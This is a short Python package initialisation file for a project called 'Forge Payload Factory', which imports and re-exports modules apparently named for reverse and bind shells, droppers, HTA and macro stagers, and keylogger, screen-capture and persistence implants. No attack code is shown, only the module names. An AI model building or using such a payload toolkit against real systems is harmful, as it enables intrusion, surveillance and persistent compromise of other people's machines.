# Forge Payload Factory
from . import generator
from .shells import reverse_tcp, reverse_https, bind_shell
from .stagers import dropper, hta_stager, macro_stager
from .implants import keylogger, screencap, persistence

__all__ = [
    "generator",
    "reverse_tcp", "reverse_https", "bind_shell",
    "dropper", "hta_stager", "macro_stager",
    "keylogger", "screencap", "persistence",
]
